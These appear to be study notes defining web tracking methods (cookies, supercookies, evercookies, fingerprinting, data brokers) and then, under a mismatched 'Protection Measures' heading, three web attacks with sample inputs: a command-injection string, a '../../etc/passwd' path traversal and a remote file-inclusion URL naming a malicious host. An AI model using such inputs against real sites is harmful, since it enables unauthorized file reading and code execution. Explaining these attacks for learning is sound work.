- **Third-party cookies:** These are cookies set by a domain other than the one you are currently visiting. They are often used by advertisers to track your browsing across different sites.

- **Supercookies:**
  These are special tracking cookies that are harder to delete. Unlike normal cookies, they can be stored in unusual places like HTTP headers or other parts of your device, making them difficult to remove.

- **Evercookies (Zombie cookies):**
  These are even trickier. They store tracking data in many different places (like Flash storage, browser history, HTML5 storage). If you delete the cookie, the website can "resurrect" it using other saved data—like a zombie coming back to life.
- **Tracking URLs**:
Tracking URLs have extra information (parameters) in them to record details like where you clicked the link, how many times, and what you do after clicking. (Like affiliate links that track purchases.)
**Browser Fingerprinting**: 
Websites gather lots of small details from your browser and device (like screen size, fonts installed, browser version, plugins) to create a unique "fingerprint." This fingerprint can identify you without using cookies. Because these details vary from person to person, fingerprinting can uniquely identify millions of users even if cookies are blocked.
- **Corporate Surveillance**: Companies track users extensively, monitoring their behavior, relationships, interests, and even emotional states. 
  - **Data Brokers:** 
  Companies that collect, buy, and sell massive amounts of personal data from various sources, often without your knowledge.
- **Protection Measures Against Tracking**: 
- **Command Injection**: Website lets users run commands on the server without proper checks. (e.g., `nslookup ...; XXX`)
- **Path Traversal**: Users manipulate file paths to access unauthorized files (e.g., `../../etc/passwd`).
- **File Inclusion**: Users can include files from the server or remote locations, potentially executing malicious code (e.g., `index.php?name=http://badsite.com/malicious.php` instead of `http://example.com/index.php?page=about.php`).